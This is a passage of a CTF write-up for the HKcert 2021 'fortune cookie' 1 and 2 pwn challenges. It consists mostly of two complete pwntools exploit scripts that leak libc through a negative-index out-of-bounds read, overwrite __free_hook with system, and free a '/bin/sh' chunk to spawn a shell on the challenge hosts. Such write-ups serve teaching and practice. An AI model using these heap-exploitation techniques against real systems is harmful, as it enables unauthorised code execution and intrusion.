p64(target-0x68)) show(5) p.recv(8) #input() libc_base = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x3c5620 info(f\u0026#34;libc_base: {hex(libc_base)}\u0026#34;) free_hook = libc_base + libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] step 4: get shell change the place pointed to #5 chunk addrss point to __free_hook and edit it with system address. call eatcookie() to free a chunk contains /bin/sh` to get shell\nedit(-11, p64(free_hook)) edit(5, p64(system)) eat() full exploit script:\nfrom pwn import * target = \u0026#39;./chall\u0026#39; host = \u0026#39;chalp.hkcert21.pwnable.hk\u0026#39; port = 38230 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 #context.log_level = \u0026#39;debug\u0026#39; elf = elf(target) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(host, port) libc = elf(\u0026#34;./libc-2.23.so\u0026#34;) else: p = process(target ,env = {\u0026#34;ld_preload\u0026#34;: \u0026#34;./libc-2.23.so\u0026#34;}) libc = elf.libc gdbscript = \u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39; if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;gdb\u0026#39;: gdb.attach(p, gdbscript=gdbscript) #--- def eat(): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;1\u0026#39;) def create(size, data): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;2\u0026#39;) p.sendlineafter(\u0026#34;how long is the message?\u0026#34;, str(size)) p.sendlineafter(\u0026#34;input your message:\u0026#34;, data) def edit(idx, data): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;3\u0026#39;) p.sendlineafter(\u0026#34;which cookie?\u0026#34;, str(idx)) p.sendafter(\u0026#34;new message:\u0026#34;, data) def show(idx): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;4\u0026#39;) p.sendlineafter(\u0026#34;which cookie?\u0026#34;, str(idx)) #print(p.recvline()) show(-11) p.recv(7) leak = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) info(f\u0026#34;leak: {hex(leak)}\u0026#34;) for i in range(27): create(0x88, b\u0026#34;/bin/sh\\x00\u0026#34;) target = leak + 0x80 edit(-11, p64(target)) edit(-11, p64(target-0x68)) show(5) p.recv(8) #input() libc_base = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x3c5620 info(f\u0026#34;libc_base: {hex(libc_base)}\u0026#34;) free_hook = libc_base + libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] edit(-11, p64(free_hook)) edit(5, p64(system)) eat() p.interactive() fortune cookie 2 this challenge has the source as fortune cookie 1 so i used the same exploit script with a little change related to the different of libc version.\nfull exploit script:\nfrom pwn import * target = \u0026#39;./chall\u0026#39; host = \u0026#39;chalp.hkcert21.pwnable.hk\u0026#39; port = 38231 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 #context.log_level = \u0026#39;debug\u0026#39; elf = elf(target) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(host, port) libc = elf(\u0026#34;./libc-2.27.so\u0026#34;) else: p = process(target ,env = {\u0026#34;ld_preload\u0026#34;: \u0026#34;./libc-2.27.so\u0026#34;}) libc = elf.libc gdbscript = \u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39; if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;gdb\u0026#39;: gdb.attach(p, gdbscript=gdbscript) #--- def eat(): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;1\u0026#39;) def create(size, data): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;2\u0026#39;) p.sendlineafter(\u0026#34;how long is the message?\u0026#34;, str(size)) p.sendlineafter(\u0026#34;input your message:\u0026#34;, data) def edit(idx, data): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;3\u0026#39;) p.sendlineafter(\u0026#34;which cookie?\u0026#34;, str(idx)) p.sendafter(\u0026#34;new message:\u0026#34;, data) def show(idx): p.sendlineafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;4\u0026#39;) p.sendlineafter(\u0026#34;which cookie?\u0026#34;, str(idx)) #print(p.recvline()) show(-11) p.recv(7) target = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) + 0x80 info(f\u0026#34;target: {hex(target)}\u0026#34;) for i in range(27): create(0x88, b\u0026#34;/bin/sh\\x00\u0026#34;) # #input() edit(-11, p64(target)) edit(-11, p64(target-0x68)) show(5) p.recv(8) #input() libc_base = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) -0x3ec760 info(f\u0026#34;libc_base: {hex(libc_base)}\u0026#34;) free_hook = libc_base + libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] edit(-11, p64(free_hook)) edit(5, p64(system)) print(\u0026#34;hi\u0026#34;) eat() p.interactive() ","title":"HKcertCTF 2021 Writeups"}]
}

